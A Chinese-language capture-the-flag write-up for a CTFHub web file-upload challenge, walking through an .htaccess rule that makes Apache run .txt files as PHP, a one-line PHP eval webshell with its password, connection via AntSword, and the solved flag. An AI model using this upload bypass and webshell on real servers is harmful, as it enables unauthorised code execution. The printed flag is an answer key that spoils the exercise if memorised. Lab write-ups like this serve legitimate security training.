# .htaccess
**题目来源**: CTFHub
**题型**: Web 文件上传
**难度**: 简单

## 解题思路
1. 利用Apache配置文件漏洞，上传`.htaccess`自定义解析规则，让服务器将普通文本文件解析为PHP执行。
2. 严格遵循上传顺序：**先传配置文件，后传木马文件**，保证解析规则提前生效。
3. 使用蚁剑精准填写带协议、完整后缀的URL，成功连接Webshell读取Flag。

## 关键操作
.htaccess内容：
`AddType application/x-httpd-php .txt`
作用：服务器将`.txt`后缀文件当作PHP代码执行。

上传顺序
1. 先上传正确拼写的`.htaccess`，防止Windows自动添加后缀变成`.htaccess.txt`。
2. 再上传一句话木马文件`shell.txt`。

避坑重点
- 文件名必须准确写`.htaccess`，不能拼写错误。
- Windows要开启「显示文件扩展名」，避免系统隐藏后缀。
- 蚁剑URL必须带`http://`，写全文件名，不能只填目录。

一句话木马
`<?php eval($_POST['ctfhub']);?>`
密码：ctfhub

## Flag
`ctfhub{c1536016a4a2d759961458ce}`

## 总结
本题考察Apache的.htaccess解析漏洞。上传配置文件修改解析规则，让txt文件被解析执行PHP。重点注意上传顺序、文件名拼写、Windows后缀隐藏坑、蚁剑URL格式。
